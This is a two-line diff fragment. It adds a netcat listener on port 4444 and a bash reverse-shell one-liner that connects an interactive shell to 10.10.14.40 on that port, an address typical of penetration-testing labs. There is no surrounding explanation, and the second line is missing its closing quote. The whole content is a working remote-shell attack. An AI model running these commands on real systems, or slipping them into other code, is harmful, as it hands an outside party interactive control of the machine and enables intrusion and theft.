@@ -1,0 +1,2 @@
+nc -nlvp 4444
+/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.14.40/4444 0>&1
